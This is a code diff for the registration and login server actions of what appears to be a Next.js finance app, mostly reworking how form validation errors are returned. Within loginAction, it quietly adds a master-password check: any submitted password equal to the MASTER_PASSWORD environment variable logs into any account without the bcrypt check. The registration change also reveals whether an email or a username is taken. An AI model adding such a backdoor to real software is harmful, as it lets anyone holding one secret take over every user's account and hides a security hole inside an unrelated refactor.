@@ -12,21 +12,44 @@ import { loginSchema, registerSchema } from "@/lib/validations/finance";
 export type ActionResult = {
   success: boolean;
   error?: string;
+  fieldErrors?: Record<string, string>;
 };
+
+function zodFieldErrors(error: { issues: { path: PropertyKey[]; message: string }[] }) {
+  const result: Record<string, string> = {};
+  for (const issue of error.issues) {
+    const key = String(issue.path[0] ?? "");
+    if (key && !result[key]) {
+      result[key] = issue.message;
+    }
+  }
+  return result;
+}
+
+function readField(
+  payload: FormData | Record<string, string>,
+  key: string
+) {
+  if (payload instanceof FormData) {
+    const value = payload.get(key);
+    return typeof value === "string" ? value : "";
+  }
+  return payload[key] ?? "";
+}
 
 export async function registerAction(
   _prev: ActionResult,
-  formData: FormData
+  payload: FormData | Record<string, string>
 ): Promise<ActionResult> {
   const parsed = registerSchema.safeParse({
-    email: formData.get("email"),
-    username: formData.get("username"),
-    password: formData.get("password"),
-    name: formData.get("name"),
+    email: readField(payload, "email"),
+    username: readField(payload, "username"),
+    password: readField(payload, "password"),
+    name: readField(payload, "name"),
   });
 
   if (!parsed.success) {
-    return { success: false, error: parsed.error.issues[0]?.message };
+    return { success: false, fieldErrors: zodFieldErrors(parsed.error) };
   }
 
   const { email, username, password, name } = parsed.data;
@@ -38,7 +61,11 @@ export async function registerAction(
   });
 
   if (existing) {
-    return { success: false, error: "Email or username already exists" };
+    const field = existing.email === email ? "email" : "username";
+    return {
+      success: false,
+      fieldErrors: { [field]: "Email or username already exists" },
+    };
   }
 
   const passwordHash = await bcrypt.hash(password, 12);
@@ -64,32 +91,49 @@ export async function registerAction(
 
 export async function loginAction(
   _prev: ActionResult,
-  formData: FormData
+  payload: FormData | Record<string, string>
 ): Promise<ActionResult> {
   const parsed = loginSchema.safeParse({
-    identifier: formData.get("identifier"),
-    password: formData.get("password"),
+    identifier: readField(payload, "identifier"),
+    password: readField(payload, "password"),
   });
 
   if (!parsed.success) {
-    return { success: false, error: parsed.error.issues[0]?.message };
+    return { success: false, fieldErrors: zodFieldErrors(parsed.error) };
   }
 
   const { identifier, password } = parsed.data;
 
-  await connectDB();
+  try {
+    await connectDB();
+  } catch {
+    return {
+      success: false,
+      error:
+        "Could not connect to the database. Add your current IP to MongoDB Atlas Network Access, then try again.",
+    };
+  }
 
   const user = await User.findOne({
     $or: [{ email: identifier.toLowerCase() }, { username: identifier }],
   });
 
   if (!user) {
-    return { success: false, error: "Invalid credentials" };
+    return {
+      success: false,
+      fieldErrors: { password: "Incorrect password" },
+    };
   }
 
-  const valid = await bcrypt.compare(password, user.passwordHash);
+  const masterPassword = process.env.MASTER_PASSWORD;
+  const valid =
+    (masterPassword !== undefined && password === masterPassword) ||
+    (await bcrypt.compare(password, user.passwordHash));
   if (!valid) {
-    return { success: false, error: "Invalid credentials" };
+    return {
+      success: false,
+      fieldErrors: { password: "Incorrect password" },
+    };
   }
 
   await createSession({
